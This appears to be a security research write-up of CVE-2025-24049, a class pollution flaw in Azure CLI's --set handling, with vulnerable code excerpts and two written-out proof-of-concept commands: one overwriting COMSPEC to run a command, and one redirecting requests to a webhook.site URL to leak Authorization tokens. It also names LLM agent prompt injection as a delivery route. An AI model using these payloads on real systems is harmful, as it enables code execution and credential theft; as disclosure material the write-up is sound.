---
title: "Azure CLI"
weight: 2
---

# Azure CLI (CVE-2025-24049)

**Azure Command-Line Interface (CLI)** is Microsoft's official tool for managing Azure resources (4.1K stars, 91.6K weekly downloads).

| Field | Value |
|-------|-------|
| Repository | [Azure/azure-cli](https://github.com/Azure/azure-cli) |
| Version | v2.68.0 |
| CVE | [CVE-2025-24049](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-24049) |
| Type | Agnostic-Get × Dual-Set |
| Input | Local (--set argument) |
| Consequences | RCE, Authorization Token Exfiltration |
| Status | Fixed |

## Summary

We identified a class pollution vulnerability in Azure CLI that allows attackers to overwrite global variables and class/function attributes across all Python modules at runtime. This vulnerability can lead to severe consequences, including arbitrary OS command execution and authorization credentials leakage through request hijacking.

## Vulnerability

Azure CLI provides users with the `update` command to set properties for various resources. For example, the command `az webapp update --ids X --set tags.a=b` updates the tags of the web app `X` by adding a key `a` with the value `b`. However, the `update` operation handler, implemented in the `set_properties` function, does not properly sanitize or filter out "dunder" (double underscore) keys, such as `__globals__`. Therefore, attackers can construct a specific key path that traverses from the instance object and pollutes sensitive variables/attributes across global scopes.

Note that all `update` commands with the `--set` argument are vulnerable, as they share the same underlying code. In this report, we use `az webapp update` as an example.

[`azure/cli/core/commands/arm.py`](https://github.com/Azure/azure-cli/blob/f0b5572c4ccafb383de08beb509045145fdc871f/src/azure-cli-core/azure/cli/core/commands/arm.py#L478-L524):

```python
def set_properties(instance, expression, force_string):
    key, value = _split_key_value_pair(expression)
    ...
    name, path = _get_name_path(key)
    ...
    instance = _find_property(instance, path)
    ...
    try:
        if index_value is not None:
            instance[index_value] = value           # if destination object is a list
        elif isinstance(instance, dict):
            instance[name] = value                  # if destination object is a dict
        ...
        else:
            if hasattr(instance, make_snake_case(name)):
                setattr(instance, make_snake_case(name), value)  # if destination object is an object
```

[`azure/cli/core/commands/arm.py`](https://github.com/Azure/azure-cli/blob/f0b5572c4ccafb383de08beb509045145fdc871f/src/azure-cli-core/azure/cli/core/commands/arm.py#L658-L706):

```python
def _update_instance(instance, part, path):
    try:
        ...
        if isinstance(instance, dict):
            return instance[part]                    # Item-Get (no case conversion)

        if hasattr(instance, make_snake_case(part)):
            return getattr(instance, make_snake_case(part), None)  # Attr-Get
        ...

def _find_property(instance, path):
    for part in path:
        instance = _update_instance(instance, part, path)
    return instance

snake_regex_1 = re.compile('(.)([A-Z][a-z]+)')
snake_regex_2 = re.compile('([a-z0-9])([A-Z])')

def make_snake_case(s):
    if isinstance(s, str):
        s1 = re.sub(snake_regex_1, r'\1_\2', s)
        return re.sub(snake_regex_2, r'\1_\2', s1).lower()
    return s
```

The functions:
1. Split the attacker-controlled key by dots
2. Resolve each segment via `getattr` or `__getitem__` (Agnostic-Get)
3. Set the final attribute with `setattr` or `__setitem__` (Dual-Set)

No validation is performed on the attribute path.

### Polluting All Loaded Modules

To pollute all loaded modules within the current Python runtime, we exploit the `modules` attribute of the `sys` module, which contains references to all loaded modules. Since the target module (e.g., `azure/mgmt/web/v2023_01_01/models/_models_py3.py`) imports `sys`, it can be accessed through the path `__class__.__init__.__globals__.sys`. Using this path, we can obtain access to all modules loaded during runtime.

### Bypassing Attribute Case Conversion

The `make_snake_case` function converts attribute names to lowercase (e.g., `WebAppsOperations` becomes `web_apps_operations`), preventing direct access to CamelCase class names. However, this restriction applies only to object attributes, not to dictionary keys. To bypass this, we use the `__dict__` attribute of an object, which returns all attributes as a dictionary, thereby avoiding case conversion. For instance, to access `WebAppsOperations`, we use:

```
__class__.__init__.__globals__.sys.modules.azure.mgmt.web.v2023_01_01.operations._web_apps_operations.__dict__.WebAppsOperations
```

## PoC

### Consequence 1: OS Command Execution

[Video PoC](https://drive.google.com/file/d/1R-ISsS4aPaY3SIjTK6H1DIYg0wdp9WA7/view?usp=sharing)

**Steps:**

1. Open Azure CLI in interactive mode.
2. Login and ensure the account has access to certain available resources, e.g., a webapp with id `X`.
3. Input the following payload to pollute `os.environ.COMSPEC`:

```bash
az resource update --ids "/subscriptions/4aa14d6e-cfd5-4ec6-9b5c-22d3c72dd75c/resourceGroups/cdn/providers/Microsoft.Cdn/profiles/test/endpoints/eduodltiendpoint" --set "__class__.__init__.__globals__.sys.modules.subprocess.os.environ._data.COMSPEC=cmd /c calc"
```

4. Trigger command execution via any of the following:

```bash
az blueprint -h
az upgrade
Ctrl+C
```

**Effect**: On Windows, Azure CLI uses `COMSPEC` to spawn subprocesses via `subprocess.Popen` with `shell=True`. Overwriting it with a malicious command causes arbitrary code execution when Azure CLI subsequently spawns a subprocess (e.g., during extension installation, CLI upgrade, or CLI exit).

[`azure/cli/core/extension/dynamic_install.py`](https://github.com/Azure/azure-cli/blob/f0b5572c4ccafb383de08beb509045145fdc871f/src/azure-cli-core/azure/cli/core/extension/dynamic_install.py#L246):

```python
def _check_value_in_extensions(cli_ctx, parser, args, no_prompt):
    ...
    if run_after_extension_installed:
        import subprocess
        import platform
        exit_code = subprocess.call(args, shell=platform.system() == 'Windows')
```

---

### Consequence 2: Authorization Credential Leakage

[Video PoC](https://drive.google.com/file/d/1BmCpBTV0PkSZYRFDDA38TVKfU5mt-wZf/view?usp=sharing)

**Steps:**

1. Open Azure CLI in interactive mode.
2. Login and ensure the account has access to certain available resources, e.g., a webapp with id `X`.
3. Input the following payload to pollute the request URL metadata:

```bash
az webapp update --ids X "--set" "__class__.__init__.__globals__.sys.modules.azure.mgmt.web.v2023_01_01.operations._web_apps_operations.__dict__.WebAppsOperations._create_or_update_initial.metadata.url=https://webhook.site/5d69807c-c2aa-4fc2-b165-78880fac827d"
```

4. Listen to the above URL to hook the user request.

**Effect**: When Azure CLI interacts with the server, it uses the `url` specified in the `metadata` attribute of `WebAppsOperations._create_or_update_initial` to construct the request. By polluting this attribute with an attacker-controlled domain, subsequent requests — including those containing the `Authorization` header — are redirected to the attacker's server, leaking Azure credentials.

[`azure/mgmt/web/v2023_01_01/operations/_web_apps_operations.py`](https://github.com/Azure/azure-cli/blob/f0b5572c4ccafb383de08beb509045145fdc871f/src/azure-cli/azure/mgmt/web/v2023_01_01/operations/_web_apps_operations.py):

```python
def _create_or_update_initial(
    self, resource_group_name: str, name: str, site_envelope: Union[_models.Site, IO], **kwargs: Any
) -> _models.Site:
    ...
    request = build_create_or_update_request(
        resource_group_name=resource_group_name,
        ...
        template_url=self._create_or_update_initial.metadata["url"],  # Polluted
        headers=_headers,
        params=_params,
    )
    request = _convert_request(request)
    request.url = self._client.format_url(request.url)

    pipeline_response: PipelineResponse = self._client._pipeline.run(
        request, stream=_stream, **kwargs
    )
    ...

_create_or_update_initial.metadata = {
    "url": "/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Web/sites/{name}"
}
```

## Impact

Azure CLI is installed on millions of developer machines and CI/CD pipelines. The `--set` argument is commonly used in automation scripts. An attacker who can influence the `--set` value (e.g., via a malicious config file, CI pipeline parameter, or LLM agent prompt injection) achieves command execution or credential exfiltration. Microsoft acknowledged and patched the vulnerability, assigning CVE-2025-24049.

## Proof of Concept

[`cp-collection/azure-cli/poc/`](https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/azure-cli/poc)
&mdash; runnable exploit environment with `run.sh` and `requirements.txt`.
